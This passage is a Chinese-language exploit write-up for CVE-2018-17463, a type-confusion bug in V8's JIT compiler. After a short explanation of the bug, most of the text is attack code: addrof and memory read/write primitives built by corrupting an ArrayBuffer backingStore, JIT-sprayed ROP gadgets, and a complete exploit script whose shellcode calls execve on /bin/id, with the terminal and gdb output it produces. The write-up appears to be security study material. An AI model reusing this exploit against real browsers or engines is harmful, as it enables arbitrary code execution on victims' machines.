      ...
```

不過如果要觀察是否 IR operation 會有 side-effect，必須要從 lower phase 來看 (直接是 machine insn)，對於 `JSCreateObject()` 來說，底層的實作在 [js-generic-lowering.cc]()：

```cpp
void JSGenericLowering::LowerJSCreateObject(Node* node) {
      CallDescriptor::Flags flags = FrameStateFlagForCall(node);
      Callable callable = Builtins::CallableFor(
          isolate(), Builtins::kCreateObjectWithoutProperties);
      ReplaceWithStubCall(node, callable, flags);
}
```

這代表 `JSCreateObject()` 底層會呼叫 runtime function `CreateObjectWithoutProperties()`，而這個 function 最後會呼叫另一個用 C++ 實作的 built-in function `ObjectCreate()`，最後 control flow 會停在 `JSObject::OptimizeAsPrototype()` (v8/src/objects.cc)，但這個 function 可能會在 optimization 的過程中修改到 prototype object 而造成 side-effect：

```cpp
// static
void JSObject::OptimizeAsPrototype(Handle<JSObject> object,
                                   bool enable_setup_mode) {
  ...
  if (enable_setup_mode && PrototypeBenefitsFromNormalization(object)) {
    // First normalize to ensure all JSFunctions are DATA_CONSTANT.
    JSObject::NormalizeProperties(object, KEEP_INOBJECT_PROPERTIES, 0,
                                  "NormalizeAsPrototype");
  }
  if (object->map()->is_prototype_map()) {
    if (object->map()->should_be_fast_prototype_map() &&
        !object->HasFastProperties()) {
      JSObject::MigrateSlowToFast(object, 0, "OptimizeAsPrototype");
    }
  } else {
    Handle<Map> new_map = Map::Copy(object->GetIsolate(),
                                    handle(object->map(), object->GetIsolate()),
                                    "CopyAsPrototype");
    JSObject::MigrateToMap(object, new_map);
    object->map()->set_is_prototype_map(true);

    // Replace the pointer to the exact constructor with the Object function
    // from the same context if undetectable from JS. This is to avoid keeping
    // memory alive unnecessarily.
    Object* maybe_constructor = object->map()->GetConstructor();
    if (maybe_constructor->IsJSFunction()) {
      JSFunction* constructor = JSFunction::cast(maybe_constructor);
      if (!constructor->shared()->IsApiFunction()) {
        Context* context = constructor->context()->native_context();
        JSFunction* object_function = context->object_function();
        object->map()->SetConstructor(object_function);
      }
    }
  }
}
```

測試：

```js
function hax(o) {
	// Force a CheckMaps node.
	o.a;

	// Cause unexpected side-effects.
	Object.create(o);

	// Trigger type-confusion because CheckMaps node is removed.
	return o.b;
}
```

debug mode：

```
d8> let o = {a: 42}
d8> o.b = 43

d8> %DebugPrint(o)
DebugPrint: 0xa777a982da1: [JS_OBJECT_TYPE]
 - map: 0x04705bb8c9d1 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x26236aa046d9 <Object map = 0x4705bb822f1>
 - elements: 0x039585802cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x0a777a984f29 <PropertyArray[3]> {
    #a: 42 (data field 0)
    #b: 43 (data field 1) properties[0]
 }
 ...
{a: 42, b: 43}
```

```
d8> hax(o)

d8> %DebugPrint(o)
DebugPrint: 0xa777a982da1: [JS_OBJECT_TYPE]
 - map: 0x04705bb8be91 <Map(HOLEY_ELEMENTS)> [DictionaryProperties]
 - prototype: 0x26236aa046d9 <Object map = 0x4705bb822f1>
 - elements: 0x039585802cf1 <FixedArray[0]> [HOLEY_ELEMENTS]
 - properties: 0x0a777a9857a1 <NameDictionary[29]> {
   #a: 42 (data, dict_index: 1, attrs: [WEC])
   #b: 43 (data, dict_index: 2, attrs: [WEC])
 }
...
{a: 42, b: 43}
```

明顯在執行完 optimize 後的 `hax()`，function 內部的  `Object.create()` 讓 map 的 type 變成 `DictionaryProperties`。在文章中有註明說 **when becoming a prototype, out-of-line property storage of the object was converted to dictionary mode**，代表改變變成 prototype 時，out-of-line property 會轉成 dictionary 的格式，第二個 8 bytes 不再指向 `PropertyArray` 而是 `NameDictionary`：

- `PropertyArray` - all properties one after each other, after a short header
- `NameDictionary` - a more complex data structure directly mapping property names to values without relying on the Map

會造成 Map change 的原因是因為 v8 內的 prototype Maps 不會 shared，因為 **clever optimization tricks** in other parts of the engine。要 trigger bug 有些條件：

1. The function must receive an object that is **not currently used as a prototype**
2. The function needs to perform a **CheckMap operation** so that subsequent ones can be eliminated
3. The function needs to call `Object.create()` with the object as argument to **trigger the Map transition**
4. The function needs to access an **out-of-line property**
   - This will, after a `CheckMap` that will later be incorrectly eliminated, load **the pointer to the property storage**, then deference that believing that it is pointing to a `PropertyArray` even though it will point to a `NameDictionary`
     - 以為指向 `PropertyArray`，但是在 `Object.create()` 後會指向 `NameDictionary`



**exploit**

`Object.create()` 這個 function 本來就會改變 prototype，但是因為 JIT 不知道這個 side effect，因此除掉了後續的檢測，導致在存取時會以 `PropertyArray` type 來做存取。



這個 bug 可以讓 type 為  `PropertyArray` 的 array 作為 type  `NameDictionary` 來存取 (type confusion)，不過 `NameDictionary` 仍然在 dynamically sized inline buffer 中有存 name、value、flags 等等 properties。然而，會存在一組 property `P1` 以及 `P2` 分別存在 `PropertyArray` 或 `NameDictionary` 開頭的偏移某處，不過 `NameDictionary` 的結構會隨著 runtime environment 調整 (牽扯到 hashing mechanism)。這也代表著 `PropertyArray` 跟 `NameDictionary` 有一部分是 overlap，因此可以控制 `NameDictionary` 內的 value。

```
DebugPrint: 0x391c0bf58569: [JSArray]
 - map: 0x3ef777f04fa1 <Map(PACKED_ELEMENTS)> [FastProperties]
 - prototype: 0x26800da13b61 <JSArray[0]>
 - elements: 0x391c0bf58459 <FixedArray[32]> [PACKED_ELEMENTS]
 - length: 32
 - properties: 0x13e904882cf1 <FixedArray[0]> {
    #length: 0x27b2cd01a0a9 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x391c0bf58459 <FixedArray[32]> {
           0: 33
           1: 0
           2: 64
           3: 34
           4: 0
           5: 0x0e30f15e5051 <String[2]: p6>
           6: -6
           7: 2288
        8-10: 0x13e9048825a1 <undefined>
          11: 0x0e30f15e5279 <String[3]: p29>
          12: -29 <----- (here)
          13: 8176
       14-19: 0x13e9048825a1 <undefined>
          20: 0x0e30f15e50b1 <String[3]: p10>
          21: -10
          22: 3312
       23-28: 0x13e9048825a1 <undefined>
          29: 0x0e30f15e5021 <String[2]: p4>
          30: -4
          31: 1776
 }
```



map 會存 property 的 type information，以下方為例子：

```js
let o = {}
o.a = 1337;
o.b = {x: 42};
```

- o 的 map 會紀錄 `.a` 為 smi，`.b` 為 object (有其他的 map)

```js
function foo(o) {
	return o.b.x;
}
```

- 在優化完後只會檢查 `o` 的 map 而不會檢查 `.b`，而如果 type information 跟實際的 value type 不相同，engine 會分配新的 map，並且標注 property 的 type 可能會是舊的跟新的

有了這些資訊就能建構出 exploit primitive：

- 先找出 properties 當中的 matching pair property，而 compiler 會認定 P1 只會被 load typeA，但是轉換後的 P2 可以被 load typeB，但先前提到說若有不同的 type information，engine 會分配一個新的 map 同時包含兩種 type 的存取方式，此時就可以選擇要使用哪種 type (因為都是 valid)

在此之前必須要找到 overlap 的 property index，才能構造出 `addrof()` 的 primitive，以下 sample code 包含了 `addrof()` 以及 `findOverlappingProperties()` 的做法，並且有加上註解：

```js
// find a pair (p1, p2) of properties such that p1 is stored at the same
// offset in the FixedArray as p2 is in the NameDictionary
let p1, p2;
function findOverlappingProperties() {
    let prop_names = [];
    for (let i = 0; i < PROP_NUM; i++)
        prop_names[i] = 'p' + i;

    let command = `
        function hax(o) {
            o.inline;
            this.Object.create(o);
            ${prop_names.map((p) => `let ${p} = o.${p};`).join('\n')}
            

            // if bug happens, o.0 ~ o.p31 are accessed as FixArray
            // but actually they are NameDictionary
            // return [o.p0 ~ o.p31]
            return [${prop_names.join(', ')}];
        }
    `;
    eval(command);

    let prop_vals = [];
    for (let i = 1; i < PROP_NUM; i++)
        // there are some unrelated, small-valued SMIs in the dictionary
        // however they are all positive, so use negative SMIs
        // don't use -0 though, that would be represented as a double
        prop_vals[i] = -i;

    // JIT + find overlap property
    for (let j = 0; j < JIT_ITERATION; j++) {
        let obj = makeObj(prop_vals); // obj -> PropertyArray
        let r = hax(obj); // obj -> NameDictionary
        /*
        original:
        1 -> -1
        2 -> -2
        3 -> -3
        4 -> -4
        ...
        8 -> -8

        after:
        1 -> 12345678
        2 -> -8787
        3 -> -3 (same index, nonono...)
        4 -> -8 (overlap with index 8)
        ...
        */

        // traverse all NameDictionary array and find if there is a value equal -i
        // but index != -i
        for (let i = 1; i < PROP_NUM; i++) {
            // properties that overlap with themselves cannot be used
            if (i !== -r[i] /* index != -r[i] (overlap themselves) */ &&
                r[i] < 0 /* ignore redundant dictionary value */ &&
                r[i] > -PROP_NUM /* property value is in range -1 ~ -PROP_NUM+1 */) {
                [p1, p2] = [i, -r[i]];
                // %DebugPrint(r); // b v8::base::ieee754::cosh
                // /Math.cosh(1);
                return;
            }
        }
    }
}

function addrof(obj) {
    eval(`
        function hax(o) {
            o.inline;
            this.Object.create(o);
            return o.p${p1}.x1;
        }
    `);

    let prop_vals = [];
    // property p1 should have the same Map as the one used in
    // corrupt() for simplicity
    prop_vals[p1] = {x1: 13.37, x2: 13.38};
    prop_vals[p2] = {y1: obj}; // an object contain our target

    let boom = makeObj(prop_vals);
    for (let i = 0; i < JIT_ITERATION; i++) {
        let boom = makeObj(prop_vals);
        let res = hax(boom);
        // p2 in FixArray ----> p1 in NameDictionary
        // p1.x1 (double) --> p2.y1 (obj) ===> show obj address as double
        if (res != 13.37)
            return res.toBigInt() - 1n; // tagged bit
    }

    throw "[-] addrof failed";
}
```

有了 `addrof()` 即可取得 object 的 address，而後再用同樣的方式做 `write()`，控制 object 的 element，但此時必須尋找一個 object，其 property 有某 **pointer 指向被寫入/讀取的位置**，我們能透過 overwrite 該 pointer 達到 arbitrary r/w，而該 object 即是 `ArrayBuffer`，步驟如下：

- 建立兩個 `ArrayBuffer` ab1 與 ab2
- leak ab2 的 address
- Corrupt ab1 的 `backingStore` pointer 為指向 ab2

這樣就能透過 ab1 寫 ab2，ab2 在寫/讀任意位置：

```
	+-----------------+            +-----------------+
    |  ArrayBuffer 1  |     +---->|  ArrayBuffer 2  |
    |                 |     |     |                 |
    |  map            |     |     |  map            |
    |  properties     |     |     |  properties     |
    |  elements       |     |     |  elements       |
    |  byteLength     |     |     |  byteLength     |
    |  backingStore --+-----+     |  backingStore   |
    |  flags          |           |  flags          |
    +-----------------+           +-----------------+
```

P.S. backingStore 指向 real heap address，而不是 v8 內部的 memory region

`corrupt()` 做的行為是蓋掉某 ArrayBuffer 的 backingStore pointer：

```js
// corrupt the backingStore pointer of ab1 to
// point to ab2
function corrupt(victim, new_val) {
    eval(`
        function hax(o) {
            o.inline;
            this.Object.create(o);
            let orig = o.p${p1}.x2;
            // overwrite ab1 BS to ab2
            // overwrite p1.x2 ---> p2.
            o.p${p1}.x2 = ${new_val.toNumber()};
            return orig;
        }
    `);

    // x2 overlaps with the backingStore pointer of the ArrayBuffer

    // why ? because o has two inline property x1 and x2, and inline property
    // starts from 0x18 (after map, out-of-line properties, element pointer),
    // and x2 is located at 0x20~0x27, which equals to backingStore pointer
    // in ArrayBuffer(map, properties, element, byteLength, backingStore ...)
    
    let prop_vals = [];
    let o = {x1: 13.37, x2: 13.38};
    prop_vals[p1] = o; // will become an object map
    prop_vals[p2] = victim; // will become ArrayBuffer
    // if use {y1: victim}, will become an object map
    for (let i = 0; i < JIT_ITERATION; i++) {
        o.x2 = 13.38; // update to original value 
        let boom = makeObj(prop_vals);
        let r = hax(boom);
        if (r != 13.38)
            return r.toBigInt();
    }

    throw "[-] CorruptArrayBuffer failed";
}
```

控制了 ab2 的 BS ptr 後，即可透過 ab2 做任意讀寫，最終將這些操作做成 function：

```js
let memory = {
    write(addr, bytes) {
        driver[4] = addr; // overwrite ab2 backingStore ptr
        let memview = new Uint8Array(ab2); // uint8
        memview.set(bytes);
    }, read(addr, len) {
        driver[4] = addr;
        let memview = new Uint8Array(ab2);
        return memview.subarray(0, len);
    }, write64(addr, ptr) {
        driver[4] = addr;
        let memview = new BigUint64Array(ab2);
        memview[0] = ptr;
    }, read64(addr) {
        driver[4] = addr;
        let memview = new Uint64Array(ab2);
        return memview[0];
    }, addrof(obj) {
        ab2.leakMe = obj;
        let props = this.read64(ab2_addr + 8n); // get ool property ptr
        return this.read64(props + 15) - 1n; // read ool property first element
    }, fixup(obj) {
        let ab1_addr = this.addrof(ab1);
        let ab2_addr = this.addrof(ab2);
        this.write64(ab1_addr + 32n, ab1_orig_BS);
        this.write64(ab2_addr + 32n, ab2_orig_BS);
    }
};
```



**arbitrary code execution**

此方法稱作 JIT spray，參考 https://github.com/kdmarti2/CVE-2018-17463/blob/main/CVE-2018-17463.js，不過最終在堆 rop 以及 gadget 的設計與其有些不同：

```js
let exploit_victim = {
	trigger : function() {
		return 0xdeadbeef;
	},
	// mov rsp, QWORD PTR [rsi]
	stack_piviot_gadget : function() {
		return 0xc3268b48|0;
	},
	// pop rsi, pop rdi, pop rax
	pop_gadget: function() {
		return 0xc3585f5e|0;
	},
	// pop rdx; syscall; ret
	syscall_gadget: function() {
		return 0xc3050f5a|0;
	}
};
for (let i = 0; i < 100000; i++)
{
    exploit_victim.trigger();
    exploit_victim.pop_gadget();
    exploit_victim.syscall_gadget();
    exploit_victim.stack_piviot_gadget();
}
```

- 在執行玩 for loop 後，4 個 function 都會被 optimize

- function 在 object 當中為 **JSFunction**，而 optimize 過的 function 又稱作 **OPTIMIZED_FUNCTION**

- 其中 **JSFunction** prototype 中有一個 attribute 叫做 `code`，offset 為 `0x30`

  - JS type 為 `v8::internal::JSFunction`

- `code` 的 JS type 為 `v8::internal::Code`

  - [object source code](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/objects/code.h)，但是 JIT code 的 entry 在 [execution.cc](https://source.chromium.org/chromium/chromium/src/+/main:v8/src/execution/execution.cc;l=350;drc=612d14c8a9ad56b0f873a7c69b43da34d3ef31d8?q=execution.cc)
  - 會執行到 `raw_instruction_start()`，回傳 `code` + 0x40 (kHeaderSize)，而 `code` + 0x40 開始就是 JIT 的 code，只不過前面有一些 check，到 `code` + 0xb0 附近才開始執行我們的 function
  - 而這個區間為 R-X，又因為 `return` value 做偏移後可以當作 gadget，像是：

  ```js
  stack_piviot_gadget : function() {
  	return 0xc3268b48|0;
  },
  ```

  做完偏移後就能看成：

  ```asm
  0:   48 8b 26                mov    rsp, QWORD PTR [rsi]
  3:   c3                      ret
  ```

  因此透過此方式任意控制 gadget。



**final exploit**

```js
const JIT_ITERATION = 0x10000;
const PROP_NUM = 32;

{
    let f64 = new Float64Array(1);
    let u64 = new BigUint64Array(f64.buffer);

    // Feature request: unboxed BigInt properties so these aren't needed =)
    Number.prototype.toBigInt = function toBigInt() {
        f64[0] = this;
        return u64[0];
    };

    BigInt.prototype.toNumber = function toNumber() {
        u64[0] = this;
        return f64[0];
    };
}

function checkVuln() {
    function hax(o) {
        // force a CheckMaps node before the property access
        // must be inline property
        o.inline;

        // JSCreateObject --> ... --> JSObject::OptimizeAsPrototype
        // and this function will modify prototype and create a new map
        // it will transition the OOL property storage to dictionary mode (.outline)
        Object.create(o);

        // now JIT code is accessing a NameDictionary but it believes its loading from a FixedArray :)
        return o.outline;
    }
    for (let i = 0; i < JIT_ITERATION; i++) {
        let o = {inline: 0x1337}
        o.outline = 0x1338;
        if (hax(o) != 0x1338)
            return true;
    }
    return false;
}

// force to garbage collection --> move objects to a stable position in
// memory (OldSpace) before leaking their addresses
function gc() {
    for (let i = 0; i < 100; i++)
        new ArrayBuffer(0x100000);
}

// make an object with one inline and numerous out-of-line properties
function makeObj(prop_vals) {
    let o = {inline: 0x1337};
    for (let i = 0; i < PROP_NUM; i++)
        Object.defineProperty(o, 'p' + i, {
            writable: true,
            value: prop_vals[i],
        });
    return o;
}

// find a pair (p1, p2) of properties such that p1 is stored at the same
// offset in the FixedArray as p2 is in the NameDictionary
let p1, p2;
function findOverlappingProperties() {
    let prop_names = [];
    for (let i = 0; i < PROP_NUM; i++)
        prop_names[i] = 'p' + i;

    let command = `
        function hax(o) {
            o.inline;
            this.Object.create(o);
            ${prop_names.map((p) => `let ${p} = o.${p};`).join('\n')}
            

            // if bug happens, o.0 ~ o.p31 are accessed as FixArray
            // but actually they are NameDictionary
            // return [o.p0 ~ o.p31]
            return [${prop_names.join(', ')}];
        }
    `;
    eval(command);

    let prop_vals = [];
    for (let i = 1; i < PROP_NUM; i++)
        // there are some unrelated, small-valued SMIs in the dictionary
        // however they are all positive, so use negative SMIs
        // don't use -0 though, that would be represented as a double
        prop_vals[i] = -i;

    // JIT + find overlap property
    for (let j = 0; j < JIT_ITERATION; j++) {
        let obj = makeObj(prop_vals); // obj -> PropertyArray
        let r = hax(obj); // obj -> NameDictionary
        /*
        original:
        1 -> -1
        2 -> -2
        3 -> -3
        4 -> -4
        ...
        8 -> -8

        after:
        1 -> 12345678
        2 -> -8787
        3 -> -3 (same index, nonono...)
        4 -> -8 (overlap with index 8)
        ...
        */

        // traverse all NameDictionary array and find if there is a value equal -i
        // but index != -i
        for (let i = 1; i < PROP_NUM; i++) {
            // properties that overlap with themselves cannot be used
            if (i !== -r[i] /* index != -r[i] (overlap themselves) */ &&
                r[i] < 0 /* ignore redundant dictionary value */ &&
                r[i] > -PROP_NUM /* property value is in range -1 ~ -PROP_NUM+1 */) {
                [p1, p2] = [i, -r[i]];
                // %DebugPrint(r); // b v8::base::ieee754::cosh
                // /Math.cosh(1);
                return;
            }
        }
    }
}

function addrof(obj) {
    eval(`
        function hax(o) {
            o.inline;
            this.Object.create(o);
            return o.p${p1}.x1;
        }
    `);

    let prop_vals = [];
    // property p1 should have the same Map as the one used in
    // corrupt() for simplicity
    prop_vals[p1] = {x1: 13.37, x2: 13.38};
    prop_vals[p2] = {y1: obj}; // an object contain our target

    let boom = makeObj(prop_vals);
    for (let i = 0; i < JIT_ITERATION; i++) {
        let boom = makeObj(prop_vals);
        let res = hax(boom);
        // p2 in FixArray ----> p1 in NameDictionary
        // p1.x1 (double) --> p2.y1 (obj) ===> show obj address as double
        if (res != 13.37)
            return res.toBigInt() - 1n; // tagged bit
    }

    throw "[-] addrof failed";
}

// corrupt the backingStore pointer of ab1 to
// point to ab2
function corrupt(victim, new_val) {
    eval(`
        function hax(o) {
            o.inline;
            this.Object.create(o);
            let orig = o.p${p1}.x2;
            // overwrite ab1 BS to ab2
            // overwrite p1.x2 ---> p2.
            o.p${p1}.x2 = ${new_val.toNumber()};
            return orig;
        }
    `);

    // x2 overlaps with the backingStore pointer of the ArrayBuffer

    // why ? because o has two inline property x1 and x2, and inline property
    // starts from 0x18 (after map, out-of-line properties, element pointer),
    // and x2 is located at 0x20~0x27, which equals to backingStore pointer
    // in ArrayBuffer(map, properties, element, byteLength, backingStore ...)
    
    let prop_vals = [];
    let o = {x1: 13.37, x2: 13.38};
    prop_vals[p1] = o; // will become an object map
    prop_vals[p2] = victim; // will become ArrayBuffer
    // if use {y1: victim}, will become an object map
    for (let i = 0; i < JIT_ITERATION; i++) {
        o.x2 = 13.38; // update to original value 
        let boom = makeObj(prop_vals);
        let r = hax(boom);
        if (r != 13.38)
            return r.toBigInt();
    }

    throw "[-] CorruptArrayBuffer failed";
}

if (checkVuln()) {
    print("[*] 1. vuln CVE-2018-17463 exists");

    findOverlappingProperties();
    print(`[*] 2. find overlap property ${p1} ${p2}`);

    let ab2 = new ArrayBuffer(1024);
    let ab1 = new ArrayBuffer(1024);

    gc();
    let ab2_addr = addrof(ab2);
    print("[*] 3. leak the address of ab2");
    print(`[+] leak: ab2 address --- 0x${ab2_addr.toString(16)}`);

    let ab1_orig_BS = corrupt(ab1, ab2_addr);
    let driver = new BigUint64Array(ab1);
    let ab2_orig_BS = driver[4]; // ab1.backingStore ----> ab2
    print(`[*] 4. corrupt the BS ptr of ab1 to ab2`);
    print(`[+] leak: ab1_orig_BS --- 0x${ab1_orig_BS.toString(16)}`);
    print(`[+] leak: ab2_orig_BS --- 0x${ab2_orig_BS.toString(16)}`);
    
    // construct the memory read/write primitives
    let memory = {
        write(addr, bytes) {
            driver[4] = addr; // overwrite ab2 backingStore ptr
            let memview = new Uint8Array(ab2); // uint8
            memview.set(bytes);
        }, read(addr, len) {
            driver[4] = addr;
            let memview = new Uint8Array(ab2);
            return memview.subarray(0, len);
        }, write64(addr, ptr) {
            driver[4] = addr;
            let memview = new BigUint64Array(ab2);
            memview[0] = ptr;
        }, read64(addr) {
            driver[4] = addr;
            let memview = new BigUint64Array(ab2);
            return memview[0];
        }, addrof(obj) {
            ab2.leakMe = obj;
            let props = this.read64(ab2_addr + 8n); // get ool property ptr
            return this.read64(props + 15n) - 1n; // read ool property first element
        }, fixup(obj) {
            let ab1_addr = this.addrof(ab1);
            let ab2_addr = this.addrof(ab2);
            this.write64(ab1_addr + 32n, ab1_orig_BS);
            this.write64(ab2_addr + 32n, ab2_orig_BS);
        }
    };
    print("[*] constructed memory read/write primitives");
    print("[*] use JIT spray to get arbitrary code execution");
    let exploit_victim = {
        trigger : function(binsh) {
            return 0xdeadbeef;
        },
        //piviot (%rsi + 0x3f) -> rbp
        stack_piviot_gadget : function() {
            return 0x3f6e8b48 | 0;
        },
        //pop rsi, pop rdi, pop rax
        pop_gadget: function() {
            return 0xc3585f5e | 0;
        },
        //pop rdx; syscall; ret
        syscall_gadget: function() {
            //return 0xcc80cd5a|0;
            return 0xc3050f5a | 0;
        }
    };

    for (let i = 0; i < JIT_ITERATION; i++) {
        exploit_victim.trigger();
        exploit_victim.pop_gadget();
        exploit_victim.syscall_gadget();
        exploit_victim.stack_piviot_gadget();
    }

    /* ---------------- arbitrary code execution ---------------- */
    let exploit_victim_addr = memory.addrof(exploit_victim);
    function get_gadget_addr(func_off, code_off) {
        let jsfunc = memory.read64(exploit_victim_addr + func_off) - 1n; // get v8::intertal::JSFunction
        let code = memory.read64(jsfunc + 0x30n) - 1n; // get v8::internal::Code
        let gadget = code + 0xb0n + code_off; // although insn starts from 0x40, we shift it to our gadget
        return gadget;
    }

    // we should allocate memory together, otherwise memory layout may be changed
    let rop_chain_buf = new ArrayBuffer(4096);
    let rop_chain = new BigUint64Array(rop_chain_buf);
    /*
    mov rax, 0x3b
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    syscall
    */
    let shellcode = new Uint8Array([0x48, 0xc7, 0xc0, 0x3b, 0x0, 0x0, 0x0, 0x5f, 0x48, 0x31, 0xf6, 0x48, 0x31, 0xd2, 0xf, 0x5]);
    let shellcode_addr = memory.addrof(shellcode);
    shellcode_addr = memory.read64(shellcode_addr + 0x10n) - 1n; // get JSTypedArray elements
    shellcode_addr = shellcode_addr + 0x20n; // shift to shellcode
    print(`[+] shellcode address --- 0x${shellcode_addr.toString(16)}`);
    
    let mov_rbp_qptr_rdi_3f = get_gadget_addr(0x20n, 5n);
    let pop_rsi_rdi_rax = get_gadget_addr(0x28n, 0xan);
    let pop_rdx_syscall = get_gadget_addr(0x30n, 0xan);
    let binsh_addr = memory.addrof("/bin/id\x00") + 0x10n;

    print(`[+] gadget mov_rbp_qptr_rdi_3f --- 0x${mov_rbp_qptr_rdi_3f.toString(16)}`);
    print(`[+] gadget pop_rsi_rdi_rax --- 0x${pop_rsi_rdi_rax.toString(16)}`);
    print(`[+] gadget pop_rdx_syscall --- 0x${pop_rdx_syscall.toString(16)}`);
    print(`[+] binsh string --- 0x${binsh_addr.toString(16)}`);

    rop_chain[0] = 0xdeadbeefn; // dummy for "pop rbp"
    rop_chain[1] = pop_rsi_rdi_rax;
    rop_chain[2] = 0xdeadbeefn; // dummy for "ret 8"
    rop_chain[3] = 0x1000n; // len
    rop_chain[4] = shellcode_addr & 0xFFFFFFFFFFFFF000n; // start
    rop_chain[5] = 10n; // mprotect
    rop_chain[6] = pop_rdx_syscall;
    rop_chain[7] = 7n; // prot
    rop_chain[8] = shellcode_addr;
    rop_chain[9] = binsh_addr;

    let rop_chain_addr = memory.addrof(rop_chain);
    rop_chain_addr = memory.read64(rop_chain_addr + 0x10n) - 1n; // get JSTypedArray elements
    rop_chain_addr = memory.read64(rop_chain_addr + 0x18n); // get backingStore ptr, and it is what we need
    print(`[+] rop chain --- 0x${rop_chain_addr.toString(16)}`);

    exploit_victim_addr = memory.addrof(exploit_victim);
    let trigger_addr = memory.read64(exploit_victim_addr + 0x18n) - 1n;
    let trigger_blockctx = memory.read64(trigger_addr + 0x20n) - 1n;
    print(`[+] trigger func --- 0x${trigger_addr.toString(16)}`);
    print(`[+] trigger blockctx --- 0x${trigger_blockctx.toString(16)}`);
    // overwrite code to stack pivoting gadget
    memory.write64(trigger_addr + 0x30n, mov_rbp_qptr_rdi_3f - 0x40n);
    // overwrite ctx + 0x40 to gadget, and it is the last thing
    memory.write64(trigger_blockctx + 0x40n, rop_chain_addr);
    
    // When JIT code is called, the rsi will be block context ptr,
    // so we call gadget "mov rbp, qword ptr [rsi + 0x3f]", and it will get data from
    // trigger_blockctx + 0x40, which we have overwrited rbp to our rop_chain_addr
    // P.S. if yoy overwrite trigger_blockctx directly, you will get SIGILL

    // Finally we pivot the stack and get shell !
    exploit_victim.trigger();
} else {
    print("[*] Safe v8 version");
}
```



terminal:

```
[*] 1. vuln CVE-2018-17463 exists
[*] 2. find overlap property 9 3
[*] 3. leak the address of ab2
[+] leak: ab2 address --- 0x3cdd1307fe28
[*] 4. corrupt the BS ptr of ab1 to ab2
[+] leak: ab1_orig_BS --- 0x564a150c5540
[+] leak: ab2_orig_BS --- 0x564a150cd5a0
[*] constructed memory read/write primitives
[*] use JIT spray to get arbitrary code execution
[+] shellcode address --- 0x3565ae1f4b80
[+] gadget mov_rbp_qptr_rdi_3f --- 0x1e9fdebc26b5
[+] gadget pop_rsi_rdi_rax --- 0x1e9fdebc247a
[+] gadget pop_rdx_syscall --- 0x1e9fdebc259a
[+] binsh string --- 0xbc2aba232e8
[+] rop chain --- 0x564a150d43a0
[+] trigger func --- 0x3565ae1f4738
[+] trigger blockctx --- 0xbc2aba25648
V8 version 7.1.0 (candidate)
d8> exploit_victim.trigger()
```

gdb:

```
 RAX  0x3b
 RBX  0x1
 RCX  0x1e9fdebc259d ◂— ret
*RDX  0x0
 RDI  0xbc2aba232e8 ◂— 0x64692f6e69622f /* '/bin/id' */
 RSI  0x0
 R8   0x1
 R9   0x4c
 R10  0x2422490025a1 ◂— 0x2422490025 /* '%' */
 R11  0x316
 R12  0xffffffffffffffff
 R13  0x564a15043f48 —▸ 0x2422490029c1 ◂— 0x2422490022 /* '"' */
 R14  0xea2c38f8691 ◂— 0x2422490034 /* '4' */
 R15  0x564a15085ec0 —▸ 0x7f3d3d83b520 (Builtins_WideHandler) ◂— lea    rbx, [rip - 7]
 RBP  0xdeadbeef
 RSP  0x564a150d43f0 ◂— 0x0
*RIP  0x3565ae1f4b8e ◂— syscall  /* 0x242249003399050f */
─────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────
   0x1e9fdebc259d    ret
    ↓
   0x3565ae1f4b80    mov    rax, 0x3b
   0x3565ae1f4b87    pop    rdi
   0x3565ae1f4b88    xor    rsi, rsi
   0x3565ae1f4b8b    xor    rdx, rdx
 ► 0x3565ae1f4b8e    syscall  <SYS_execve>
        path: 0xbc2aba232e8 ◂— 0x64692f6e69622f /* '/bin/id' */
        argv: 0x0
        envp: 0x0
```

最後在 `gdb` mode 有取得 shell，但是不知道為什麼直接跑 `./d8 ./pwn.js` 不會有 shell。

